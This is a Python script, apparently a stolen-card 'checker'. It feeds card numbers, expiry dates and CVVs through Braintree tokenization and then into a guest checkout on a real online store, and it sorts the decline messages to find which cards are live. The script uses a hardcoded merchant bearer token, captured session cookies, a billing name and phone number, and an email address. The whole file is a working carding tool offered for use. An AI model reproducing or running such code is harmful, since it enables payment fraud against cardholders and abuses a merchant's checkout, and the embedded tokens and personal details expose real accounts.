import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjkwNjc4OTEsImp0aSI6ImFkZjAyMjZhLThlOTktNDgzZS05YTdmLTE1MzFkNDIxYzQ1ZiIsInN1YiI6ImRodzU3bWhtd2ozbXpibjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRodzU3bWhtd2ozbXpibjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Awq12QsNf1rJcN30m7IDSfpCq9bMDHGE6138xcFSd-74YDj62_zOmSp7g8A5AS5GtX-cXUIrfU1zn2Ey-4V75g',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'aff4c11e-16a3-4b31-9de3-f1540fd59623',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	cookies = {
	    'PHPSESSID': 'qp1c030r7nbop0gmqfptm6qbnlqmkhmv',
	    '__cf_bm': 'LQytnIYIwnV_nqzvjJJNmfeF0XHSVrr7mPh_xDqseOQ-1728981348-1.0.1.1-ucm98vEK1uNRmMbugSR2s.eAV5QB.mZLFy070FTm3LGYPWLF2jjVCEv2gr6yaxFj.ihj.2w_5Ao2Osx.wLOelQ',
	    'PHPSESSID': 'qp1c030r7nbop0gmqfptm6qbnlqmkhmv',
	    '_gid': 'GA1.2.1308292599.1728984907',
	    'cf_clearance': '9ztbbSXxkK6GwDGhQBJ8.hhpgZJeAgi1cUo4.G7VxmM-1728981356-1.2.1.1-KII4TpJ4wAu8cpBte0CR4X0kpRXUnZhc577NbFtDn46hbMEk79eHw6..cgibcQt5neTI7AwyztMYGuYsbZtFCbyb9NesoA.TD4itxTIOOU50g8t3Y_7wXzamcN8Nd2Ze7ZGkT86U9U68lDOB.GZdznqsmo5pXF4RZ6yNCsIydMoB0oPopc3gd9p4.EfTzFyN2jucahUE7fKveH2a_zHZjvPDazP.Isgcv4q1T7dhUPe8UR3Qv4WGW3sVMw80go_wpa9eCAwgu4D81dRjHwk6fIv6Y231Rzs7dGzxf5DrDvqwE3tQto7OibZ7wKczrHaOOfieZm9Rw3RuSnxUtaAsDjJEo.gYdScdUC34eWJb9P_Bl6hvBsEQDyzHFeukv2fx',
	    'form_key': 'ke30eRsgNgeAZbBi',
	    'mage-cache-storage': '%7B%7D',
	    'mage-cache-storage-section-invalidation': '%7B%7D',
	    'mage-cache-sessid': 'true',
	    'recently_viewed_product': '%7B%7D',
	    'recently_viewed_product_previous': '%7B%7D',
	    'recently_compared_product': '%7B%7D',
	    'recently_compared_product_previous': '%7B%7D',
	    'product_data_storage': '%7B%7D',
	    'form_key': 'ke30eRsgNgeAZbBi',
	    'mage-messages': '',
	    '_ga_VS3FFF3K9S': 'GS1.1.1728984906.1.1.1728985046.60.0.0',
	    '_ga': 'GA1.2.1909453630.1728984907',
	    '_gat_gtag_UA_141367017_1': '1',
	    '_gat': '1',
	    'private_content_version': '7ad230a74c264afa5ee28851c4473c45',
	    'section_data_ids': '%7B%22cart%22%3A1728981527%2C%22directory-data%22%3A1728981422%2C%22messages%22%3A1728981527%2C%22captcha%22%3A1728981527%7D',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    # 'Cookie': 'PHPSESSID=qp1c030r7nbop0gmqfptm6qbnlqmkhmv; __cf_bm=LQytnIYIwnV_nqzvjJJNmfeF0XHSVrr7mPh_xDqseOQ-1728981348-1.0.1.1-ucm98vEK1uNRmMbugSR2s.eAV5QB.mZLFy070FTm3LGYPWLF2jjVCEv2gr6yaxFj.ihj.2w_5Ao2Osx.wLOelQ; PHPSESSID=qp1c030r7nbop0gmqfptm6qbnlqmkhmv; _gid=GA1.2.1308292599.1728984907; cf_clearance=9ztbbSXxkK6GwDGhQBJ8.hhpgZJeAgi1cUo4.G7VxmM-1728981356-1.2.1.1-KII4TpJ4wAu8cpBte0CR4X0kpRXUnZhc577NbFtDn46hbMEk79eHw6..cgibcQt5neTI7AwyztMYGuYsbZtFCbyb9NesoA.TD4itxTIOOU50g8t3Y_7wXzamcN8Nd2Ze7ZGkT86U9U68lDOB.GZdznqsmo5pXF4RZ6yNCsIydMoB0oPopc3gd9p4.EfTzFyN2jucahUE7fKveH2a_zHZjvPDazP.Isgcv4q1T7dhUPe8UR3Qv4WGW3sVMw80go_wpa9eCAwgu4D81dRjHwk6fIv6Y231Rzs7dGzxf5DrDvqwE3tQto7OibZ7wKczrHaOOfieZm9Rw3RuSnxUtaAsDjJEo.gYdScdUC34eWJb9P_Bl6hvBsEQDyzHFeukv2fx; form_key=ke30eRsgNgeAZbBi; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=ke30eRsgNgeAZbBi; mage-messages=; _ga_VS3FFF3K9S=GS1.1.1728984906.1.1.1728985046.60.0.0; _ga=GA1.2.1909453630.1728984907; _gat_gtag_UA_141367017_1=1; _gat=1; private_content_version=7ad230a74c264afa5ee28851c4473c45; section_data_ids=%7B%22cart%22%3A1728981527%2C%22directory-data%22%3A1728981422%2C%22messages%22%3A1728981527%2C%22captcha%22%3A1728981527%7D',
	    'Origin': 'https://www.olystudio.com',
	    'Referer': 'https://www.olystudio.com/checkout/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'cartId': 'dF1xSq3xhzXGEG5oZZ3e8zNpOW8qWkYr',
	    'billingAddress': {
	        'countryId': 'US',
	        'regionId': '43',
	        'regionCode': 'NY',
	        'region': 'New York',
	        'street': [
	            'New York',
	        ],
	        'company': 'Mohamed Hamdy',
	        'telephone': '5162582584',
	        'postcode': '10080',
	        'city': 'New York',
	        'firstname': 'Mohamed',
	        'lastname': 'Hamdy',
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'braintree',
	        'additional_data': {
	            'payment_method_nonce': token,
	            'device_data': '{"device_session_id":"868cafd7c9790164877b7a72400aa6d7","fraud_merchant_id":null,"correlation_id":"f6a6ecde3a19f2d196abf09a0ffdb93b"}',
	        },
	        'extension_attributes': {
	            'agreement_ids': [
	                '1',
	                '2',
	            ],
	        },
	    },
	    'email': 'hafezg93@gmail.com',
	}
	
	req0 = requests.post(
	    'https://www.olystudio.com/rest/default/V1/guest-carts/dF1xSq3xhzXGEG5oZZ3e8zNpOW8qWkYr/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	if "three_d_secure" in req0.text:
		return "three_d_secure"
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
